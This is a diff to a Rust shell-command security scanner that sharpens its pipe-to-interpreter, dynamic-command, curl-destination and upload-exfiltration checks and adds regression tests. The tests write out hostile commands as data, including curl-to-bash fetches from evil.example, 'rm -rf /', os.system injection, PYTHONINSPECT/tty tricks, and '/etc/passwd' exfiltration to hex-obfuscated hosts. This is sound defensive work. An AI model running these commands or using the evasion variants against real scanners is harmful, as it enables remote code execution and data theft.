@@ -962,7 +962,19 @@ fn check_depth(
         !(wrapper_depth_exhausted
             && *gap == crate::extract::ShellExecutionGap::AmbiguousExecutableBody)
     }) {
+        let dynamic_command_name = gap
+            == crate::extract::ShellExecutionGap::AmbiguousExecutableBody
+            && segments.iter().any(|segment| {
+                segment.command.as_deref().is_some_and(|command| {
+                    !command_name_is_statically_bound(command, shell)
+                        && (command.contains('$') || command.contains('`'))
+                })
+            });
         let (title, pattern) = match gap {
+            crate::extract::ShellExecutionGap::AmbiguousExecutableBody if dynamic_command_name => (
+                "Executable name could not be resolved",
+                "dynamic command name",
+            ),
             crate::extract::ShellExecutionGap::AmbiguousPowerShellInvocation => (
                 "PowerShell grouped invocation could not be resolved",
                 "ambiguous PowerShell invocation group",
@@ -993,7 +1005,13 @@ fn check_depth(
         } else {
             redact::redact_shell_assignments(input)
         };
-        let description = if gap == crate::extract::ShellExecutionGap::WorkBudgetExceeded {
+        let description = if dynamic_command_name {
+            "The command name depends on shell state that Tirith could not resolve. \
+             Use the explicit command path in the checked command, for example \
+             `/bin/echo --help`. Quoting a variable preserves argument boundaries \
+             but does not prove which executable it selects. The unresolved \
+             command remains blocked."
+        } else if gap == crate::extract::ShellExecutionGap::WorkBudgetExceeded {
             "Tirith reached its bounded executable-body analysis budget before it could prove \
              the complete command safe. Bodies recovered before the boundary were analyzed, \
              and the unexamined suffix is blocked instead of being treated as clean."
@@ -3065,6 +3083,20 @@ fn python_has_rebinding_or_dynamic_primitive(code: &str) -> bool {
     })
 }
 
+/// A complete Python program that only prints a decimal constant (or a
+/// newline). No literal stripping or call-target inference is needed here.
+pub(crate) fn python_body_is_literal_output(body: &str) -> bool {
+    let body = body.trim();
+    let Some(argument) = body
+        .strip_prefix("print(")
+        .and_then(|argument| argument.strip_suffix(')'))
+    else {
+        return false;
+    };
+    let argument = argument.trim();
+    argument.is_empty() || argument.bytes().all(|byte| byte.is_ascii_digit())
+}
+
 /// Positive, deliberately narrow issue-136 carveout. Every call target must be
 /// a known data parser/reader or inert builtin; reflection, aliases, unresolved
 /// calls, and unsupported syntax retain the High pipe-to-interpreter finding.
@@ -3129,6 +3161,19 @@ fn python_body_is_known_data_parser(body: &str) -> bool {
 /// fail the direct-leader check, and bare `python` / `python -` have no `-c` body
 /// (stdin IS the program), so all of those keep the pipe-to-interpreter finding.
 fn is_python_dash_c_data_pipeline(seg: &tokenize::Segment, shell: ShellType) -> bool {
+    // This proof is for an actual POSIX pipe, whose stdin is not a terminal.
+    // Other shells and any redirection keep the ordinary interpreter finding.
+    // In particular, do not let stdin be redirected to a terminal where
+    // PYTHONINSPECT can enable a REPL after the fixed program exits.
+    if shell != ShellType::Posix
+        || !tokenize::leading_env_assignments(&seg.raw).is_empty()
+        || seg.args.iter().any(|arg| {
+            crate::escalation::shell_redirection_token(arg).is_some()
+                || crate::escalation::shell_redirection_suffix(arg).is_some()
+        })
+    {
+        return false;
+    }
     let Some(cmd) = seg.command.as_deref() else {
         return false;
     };
@@ -3138,17 +3183,10 @@ fn is_python_dash_c_data_pipeline(seg: &tokenize::Segment, shell: ShellType) -> 
     ) {
         return false;
     }
-    // Require an explicit `-c <body>`. Without it (bare `python`, or `python -`)
-    // the interpreter reads its PROGRAM from stdin, which must keep blocking.
-    let Some(body) = seg
-        .args
-        .iter()
-        .position(|a| a == "-c")
-        .and_then(|idx| seg.args.get(idx + 1))
-    else {
+    let Some(body) = crate::extract::literal_posix_python_inline_program(&seg.args) else {
         return false;
     };
-    python_body_is_known_data_parser(&normalize_shell_token(body, shell))
+    python_body_is_literal_output(&body) || python_body_is_known_data_parser(&body)
 }
 
 fn check_pipe_to_interpreter(
@@ -3903,8 +3941,13 @@ fn redact_env_value(val: &str) -> String {
 /// Cloud metadata endpoint IPs that expose instance credentials.
 const METADATA_ENDPOINTS: &[&str] = &["169.254.169.254", "100.100.100.200"];
 
-fn check_host_for_network_issues(arg: &str, findings: &mut Vec<Finding>) {
-    if let Some(host) = extract_host_from_arg(arg) {
+fn check_host_for_network_issues(arg: &str, client: &str, findings: &mut Vec<Finding>) {
+    let host = if client == "curl" {
+        crate::extract::curl_destination_host(arg)
+    } else {
+        extract_host_from_arg(arg)
+    };
+    if let Some(host) = host {
         if METADATA_ENDPOINTS.contains(&host.as_str()) {
             findings.push(Finding {
                 rule_id: RuleId::MetadataEndpoint,
@@ -3958,12 +4001,12 @@ fn check_network_destination(segments: &[tokenize::Segment], findings: &mut Vec<
             if trimmed.starts_with('-') {
                 // `--url=http://evil.com` style — URL is wedged into the flag value.
                 if let Some((_flag, value)) = trimmed.split_once('=') {
-                    check_host_for_network_issues(value, findings);
+                    check_host_for_network_issues(value, &cmd_base, findings);
                 }
                 continue;
             }
 
-            check_host_for_network_issues(trimmed, findings);
+            check_host_for_network_issues(trimmed, &cmd_base, findings);
         }
     }
 }
@@ -4009,6 +4052,42 @@ fn extract_fetch_destination_host(arg: &str) -> Option<String> {
     }
     let parsed = crate::extract::parse_schemeless_network_destination(arg)?;
     parsed.host().map(str::to_string)
+}
+
+fn extract_client_destination_host(client: &str, arg: &str) -> Option<String> {
+    if client == "curl" {
+        crate::extract::curl_destination_host(arg)
+    } else {
+        extract_fetch_destination_host(arg)
+    }
+}
+
+/// The raw policy entry is interpreted in the same client authority context.
+/// A DNS name containing an empty hex component must not inherit a numeric
+/// loopback/CIDR allow entry, or lose an exact DNS deny entry, during matching.
+fn matches_client_network_list(client: &str, host: &str, list: &[String]) -> bool {
+    let dns_host = (client == "curl")
+        .then(|| crate::parse::curl_empty_hex_dns_host(host))
+        .flatten();
+    let Some(host) = dns_host else {
+        return matches_network_list(host, list);
+    };
+    let host = host.trim_end_matches('.');
+    list.iter().any(|entry| {
+        let entry = entry.trim().trim_start_matches('.');
+        if entry.contains('/') {
+            return false; // DNS identity does not prove membership of any CIDR.
+        }
+        let canonical =
+            crate::parse::curl_empty_hex_dns_host(entry).or_else(|| canonical_network_host(entry));
+        canonical.is_some_and(|entry| {
+            let entry = entry.trim_end_matches('.');
+            host == entry
+                || host
+                    .strip_suffix(entry)
+                    .is_some_and(|prefix| prefix.ends_with('.'))
+        })
+    })
 }
 
 /// Strip port number from a host:port string, handling IPv6 brackets.
@@ -4514,25 +4593,43 @@ fn push_fetch_option_destinations(
     destinations: &mut Vec<String>,
     kind: FetchOptionValueKind,
     value: &str,
+    include_mapped_peers: bool,
 ) {
     match kind {
         FetchOptionValueKind::Destination => destinations.push(value.to_string()),
         FetchOptionValueKind::HttpieProxy => {
             destinations.push(httpie_proxy_peer(value).to_string())
         }
-        FetchOptionValueKind::CurlConnectTo => {
+        FetchOptionValueKind::CurlConnectTo if include_mapped_peers => {
             if let Some(peer) = curl_connect_to_peer(value) {
                 destinations.push(peer.to_string());
             }
         }
-        FetchOptionValueKind::CurlResolve => {
+        FetchOptionValueKind::CurlResolve if include_mapped_peers => {
             destinations.extend(curl_resolve_peers(value).into_iter().map(str::to_string))
         }
-        FetchOptionValueKind::NonDestination => {}
+        FetchOptionValueKind::CurlConnectTo
+        | FetchOptionValueKind::CurlResolve
+        | FetchOptionValueKind::NonDestination => {}
     }
 }
 
+/// URL-like curl operands for extraction. Connection/DNS mapping fields remain
+/// network-policy peers, but are not themselves scheme-less URL operands.
+pub(crate) fn curl_url_operands(args: &[String], shell: ShellType) -> Vec<String> {
+    fetch_destination_operands("curl", args, shell, false)
+}
+
 fn url_fetch_destination_operands(command: &str, args: &[String], shell: ShellType) -> Vec<String> {
+    fetch_destination_operands(command, args, shell, true)
+}
+
+fn fetch_destination_operands(
+    command: &str,
+    args: &[String],
+    shell: ShellType,
+    include_mapped_peers: bool,
+) -> Vec<String> {
     let mut destinations = Vec::new();
     let mut pending = None;
     let mut options_terminated = false;
@@ -4540,7 +4637,12 @@ fn url_fetch_destination_operands(command: &str, args: &[String], shell: ShellTy
     for arg in args {
         let normalized = normalize_shell_token(arg, shell);
         if let Some(kind) = pending.take() {
-            push_fetch_option_destinations(&mut destinations, kind, &normalized);
+            push_fetch_option_destinations(
+                &mut destinations,
+                kind,
+                &normalized,
+                include_mapped_peers,
+            );
             continue;
         }
         if !options_terminated && normalized == "--" {
@@ -4556,9 +4658,12 @@ fn url_fetch_destination_operands(command: &str, args: &[String], shell: ShellTy
         if !options_terminated && option_spelling.starts_with('-') && option_spelling != "-" {
             if let Some(option) = fetch_option_value(command, &option_spelling) {
                 match (option.kind, option.attached) {
-                    (kind, Some(value)) if !value.is_empty() => {
-                        push_fetch_option_destinations(&mut destinations, kind, value)
-                    }
+                    (kind, Some(value)) if !value.is_empty() => push_fetch_option_destinations(
+                        &mut destinations,
+                        kind,
+                        value,
+                        include_mapped_peers,
+                    ),
                     (_, Some(_)) => {}
                     (kind, None) => pending = Some(kind),
                 }
@@ -4688,13 +4793,13 @@ pub fn check_network_policy(
 
         if is_url_fetch_command(&cmd_base) {
             for destination in url_fetch_destination_operands(&cmd_base, resolved_args, shell) {
-                let Some(host) = extract_fetch_destination_host(&destination) else {
+                let Some(host) = extract_client_destination_host(&cmd_base, &destination) else {
                     continue;
                 };
-                if matches_network_list(&host, allow) {
+                if matches_client_network_list(&cmd_base, &host, allow) {
                     continue;
                 }
-                if matches_network_list(&host, deny) {
+                if matches_client_network_list(&cmd_base, &host, deny) {
                     findings.push(Finding {
                         rule_id: RuleId::CommandNetworkDeny,
                         severity: Severity::Critical,
@@ -4724,10 +4829,10 @@ pub fn check_network_policy(
             }
             if let Some(spec) = crate::extract::parse_scp_remote_spec(trimmed, shell) {
                 let host = spec.host;
-                if matches_network_list(&host, allow) {
+                if matches_client_network_list(&cmd_base, &host, allow) {
                     continue;
                 }
-                if matches_network_list(&host, deny) {
+                if matches_client_network_list(&cmd_base, &host, deny) {
                     findings.push(Finding {
                         rule_id: RuleId::CommandNetworkDeny,
                         severity: Severity::Critical,
@@ -8559,6 +8664,7 @@ enum UploadDestinationProof {
 }
 
 fn upload_destination_proof(
+    client: &str,
     raw: &str,
     shell: ShellType,
     literal_value: Option<&str>,
@@ -8578,12 +8684,24 @@ fn upload_destination_proof(
             // case (`https://host/$(producer)`). A dynamic authority remains
             // incomplete because `https://$(producer)` has no static host.
             let template = parsed.literal.trim();
-            if url::Url::parse(template).is_ok_and(|url| {
+            let remote = if client == "curl" {
+                let url = crate::extract::parse_curl_destination(template);
                 matches!(
-                    url.scheme().to_ascii_lowercase().as_str(),
-                    "http" | "https" | "ftp" | "ftps" | "sftp" | "scp" | "ws" | "wss"
-                ) && url.host_str().is_some_and(socket_host_remote)
-            }) {
+                    url.scheme(),
+                    Some("http" | "https" | "ftp" | "ftps" | "sftp" | "scp" | "ws" | "wss")
+                ) && url.host().is_some_and(|host| {
+                    crate::parse::curl_empty_hex_dns_host(host).is_some()
+                        || socket_host_remote(host)
+                })
+            } else {
+                url::Url::parse(template).is_ok_and(|url| {
+                    matches!(
+                        url.scheme(),
+                        "http" | "https" | "ftp" | "ftps" | "sftp" | "scp" | "ws" | "wss"
+                    ) && url.host_str().is_some_and(socket_host_remote)
+                })
+            };
+            if remote {
                 return UploadDestinationProof::Remote;
             }
             return UploadDestinationProof::Incomplete;
@@ -8602,7 +8720,7 @@ fn upload_destination_proof(
             _ => UploadDestinationProof::Incomplete,
         };
     }
-    if extract_fetch_destination_host(destination).is_some() {
+    if extract_client_destination_host(client, destination).is_some() {
         UploadDestinationProof::Remote
     } else {
         UploadDestinationProof::NonRemote
@@ -8733,7 +8851,8 @@ fn analyze_upload_client(
                         }
                         UploadOptionValueKind::Endpoint => {
                             transfer.wire_argument_indices.insert(value_index);
-                            match upload_destination_proof(value_raw, shell, literal_value) {
+                            match upload_destination_proof(command, value_raw, shell, literal_value)
+                            {
                                 UploadDestinationProof::Remote => {
                                     transfer.remote_destination = true
                                 }
@@ -8754,7 +8873,7 @@ fn analyze_upload_client(
             continue;
         }
         let transfer = transfers.last_mut().unwrap();
-        match upload_destination_proof(raw, shell, None) {
+        match upload_destination_proof(command, raw, shell, None) {
             UploadDestinationProof::Remote => {
                 transfer.remote_destination = true;
                 transfer.wire_argument_indices.insert(index);
@@ -11684,6 +11803,167 @@ mod tests {
         check_default(input, ShellType::Posix)
             .iter()
             .any(|f| f.rule_id == RuleId::PipeToInterpreter)
+    }
+
+    #[test]
+    fn issue_264_literal_output_and_stdin_data_keep_complete_analysis() {
+        for input in [
+            "echo hi | python3 -c 'print(1)'",
+            "echo hi | python3 -c 'print()'",
+            "echo hi | python3 -c 'import sys; print(sys.stdin.read())'",
+            "printf '{}' | python3 -c 'import json,sys; print(json.load(sys.stdin))'",
+        ] {
+            let findings = check_default(input, ShellType::Posix);
+            assert!(
+                findings.iter().all(|finding| !matches!(
+                    finding.rule_id,
+                    RuleId::PipeToInterpreter | RuleId::AnalysisIncomplete
+                )),
+                "{input}: {findings:?}"
+            );
+        }
+        for input in [
+            "echo hi | python3",
+            "echo hi | python3 -",
+            "echo hi | python3 -c 'import sys; exec(sys.stdin.read())'",
+            "echo hi | python3 -c 'print(__import__(\"os\").system(\"id\"))'",
+            "echo hi | python3 -c 'print(1); exec(input())'",
+            "echo hi | python3 -c 'print(1 + unknown())'",
+        ] {
+            assert!(fires_pipe_to_interpreter(input), "{input}");
+        }
+    }
+
+    #[test]
+    fn issue_264_variable_command_explains_the_unresolved_boundary() {
+        for input in [
+            r#"BIN=/bin/echo; "$BIN" --help"#,
+            r#"BIN=/bin/echo; printf '%s\n' '--- a ---'; "$BIN" --help"#,
+            r#"readonly BIN=/bin/sh; BIN=/bin/echo; "$BIN" -c 'rm -rf /'"#,
+            r#"declare -n BIN=ACTUAL; BIN=/bin/echo; "$BIN" --help"#,
+        ] {
+            let findings = check_default(input, ShellType::Posix);
+            let finding = findings
+                .iter()
+                .find(|finding| finding.title == "Executable name could not be resolved")
+                .expect("dynamic command needs an actionable explanation");
+            assert_eq!(finding.rule_id, RuleId::AnalysisIncomplete);
+            assert_eq!(finding.severity, Severity::High);
+            assert!(finding.description.contains("explicit command path"));
+            assert!(finding.description.contains("does not prove"));
+        }
+        assert!(check_default("/bin/echo --help", ShellType::Posix)
+            .iter()
+            .all(|finding| finding.rule_id != RuleId::AnalysisIncomplete));
+    }
+
+    #[test]
+    fn issue_264_python_program_selection_cannot_be_changed_by_later_dash_c() {
+        for input in [
+            "echo payload | python3 - -c 'print(1)'",
+            "echo payload | python3 script.py -c 'print(1)'",
+            "echo payload | python3 -- -c 'print(1)'",
+            "echo payload | python3 -m module -c 'print(1)'",
+            "echo payload | python3 -i -c 'print(1)'",
+            "echo payload | python3 -ic 'print(1)'",
+            "echo payload | python3 -W -c 'print(1)'",
+            "echo payload | python3 -W ignore -c 'print(1)'",
+            "echo payload | python3 -W ignore::stdin_runner.Warning -c 'print(1)'",
+            "echo payload | python3 -Wignore::stdin_runner.Warning -c 'print(1)'",
+            "echo payload | python3 -X presite=stdin_runner -c 'print(1)'",
+            "echo payload | python3 -Xpresite=stdin_runner -c 'print(1)'",
+            "echo payload | python3 $OPTIONS -c 'print(1)'",
+            "echo payload | PYTHONINSPECT=1 python3 -c 'print(1)'",
+            "echo payload | python3 -c 'print(1)' < /dev/tty",
+            "echo payload | python3 -c 'print(1)' x</dev/tty",
+            "echo payload | python3 - -c 'import sys; print(sys.stdin.read())'",
+        ] {
+            assert!(
+                fires_pipe_to_interpreter(input),
+                "program selector was not proved: {input}"
+            );
+        }
+        for input in [
+            "echo payload | python3 '-cprint(1)'",
+            "echo payload | python3 -c 'print(1)' -- -i",
+        ] {
+            assert!(!fires_pipe_to_interpreter(input), "{input}");
+        }
+    }
+
+    #[test]
+    fn issue_264_unresolved_function_names_keep_visible_body_threats() {
+        for input in [
+            "true && function \"$NAME\" { curl https://evil.example/payload | bash; }; f",
+            "function \"f\"() { curl https://evil.example/payload | bash; }; f",
+            r#"function "$(curl https://evil.example/name | bash)" { :; }; f"#,
+            r#"function "`curl https://evil.example/name | bash`" { :; }; f"#,
+            r#"function "$(curl https://evil.example/name | bash)" { curl https://evil.example/body | bash; }; f"#,
+            "function $(curl https://evil.example/name | bash) { :; }; f",
+            "function `curl https://evil.example/name | bash` { :; }; f",
+        ] {
+            let findings = check_default(input, ShellType::Posix);
+            assert!(
+                findings
+                    .iter()
+                    .any(|finding| finding.rule_id == RuleId::AnalysisIncomplete),
+                "{input}: {findings:?}"
+            );
+            assert!(
+                findings
+                    .iter()
+                    .any(|finding| finding.rule_id == RuleId::CurlPipeShell),
+                "{input}: {findings:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn issue_264_backtick_data_in_function_headers_and_bodies_stays_inert() {
+        for input in [
+            r#"function '`curl https://evil.example/data | bash`' { :; }; f"#,
+            r#"function safe { printf '%s' '`curl https://evil.example/data | bash`'; }; :"#,
+            r#"printf '%s' \`curl\ https://evil.example/data\ \|\ bash\`"#,
+        ] {
+            let findings = check_default(input, ShellType::Posix);
+            assert!(
+                findings
+                    .iter()
+                    .all(|finding| finding.rule_id != RuleId::CurlPipeShell),
+                "inert backtick data became a producer: {input}: {findings:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn issue_260_nested_static_conditions_and_arithmetic_keep_threat_findings() {
+        for input in [
+            "if [ -n \"$X\" ]; then curl https://evil.example/payload | bash; fi",
+            "while [ -n \"$X\" ]; do curl https://evil.example/payload | bash; done",
+            "echo $(( $(curl https://evil.example/payload | bash) - 100 ))",
+        ] {
+            let findings = check_default(input, ShellType::Posix);
+            assert!(
+                findings.iter().any(|finding| matches!(
+                    finding.rule_id,
+                    RuleId::CurlPipeShell | RuleId::PipeToInterpreter
+                )),
+                "visible fetched-code pipeline was lost: {input}: {findings:?}"
+            );
+        }
+        for input in [
+            "if [ -n \"$X\" ]; then echo yes; fi",
+            "echo $(( $(date +%s) - 100 ))",
+            "echo \"$(( $(date +%s) - 100 ))\"",
+        ] {
+            let findings = check_default(input, ShellType::Posix);
+            assert!(
+                findings
+                    .iter()
+                    .all(|finding| finding.rule_id != RuleId::AnalysisIncomplete),
+                "{input}: {findings:?}"
+            );
+        }
     }
 
     #[test]
@@ -16974,5 +17254,24 @@ mod tests {
                 "one-way network probe is not a reverse shell: {probe:?}; {findings:?}"
             );
         }
+    }
+    #[test]
+    fn curl_empty_hex_upload_templates_are_dns_destinations() {
+        for host in ["0x7f.0x", "127.0x", "0x.1"] {
+            let raw = format!("http://{host}/$(cat /etc/passwd)");
+            assert_eq!(
+                upload_destination_proof("curl", &raw, ShellType::Posix, None),
+                UploadDestinationProof::Remote
+            );
+        }
+        assert_eq!(
+            upload_destination_proof(
+                "curl",
+                "http://0x7f.0x1/$(cat /etc/passwd)",
+                ShellType::Posix,
+                None
+            ),
+            UploadDestinationProof::Incomplete
+        );
     }
 }
